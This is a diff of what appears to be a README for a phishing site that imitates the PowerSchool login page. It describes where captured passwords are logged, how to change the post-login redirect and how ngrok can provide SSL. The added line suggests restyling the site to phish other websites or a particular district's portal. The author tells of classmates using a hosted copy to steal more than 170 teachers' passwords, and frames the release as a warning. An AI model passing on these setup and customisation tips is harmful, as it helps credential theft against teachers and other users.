@@ -7,6 +7,8 @@ Captured passwords are stored in the log.txt which can be acessed on the demo si
 
 In logCREDS.php, you can change the site the page redirects to by changing "Location: https://powerschool.com" to a different site. 
 
+You can restyle the site to phish for other websites or to make it look like the specific powerschool for your district.
+
 The demo page does not have SSL, so most web browsers will flag the site as insecure. This is to further discourage abuse of the demo site. (I'm also too broke and don't care enough about a demo site to afford a certificate for SSL). Ngrok can be used to port forward to your localhost using SSL, but it only gives temporary, one time use urls.
 
 I decided to release this to raise awareness amongst teachers and schools about phishing. I built this website in 8th grade. Although I myself have never used this site to steal passwords, I let fellow students use a website I was hosting to do just that. It got to the point where over 170 people had used my site to legitimately steal passwords from teachers (plus around 40 test logins) before I overheard someone instructing my teacher to make sure they're not logging into powerteacher.c1.biz (no longer exists; took it down after hearing this) and an announcement telling teachers to change their powerschool passwords. The existence of my site got other people into trouble. I was never caught and took down the site as soon as possible. I wrote this little story as a warning for fellow teenagers who might try to use what I have created for similar purposes. I wouldn't use this unless my entire academic career was in jepordy. Even then, it is not worth the risk of getting caught. 
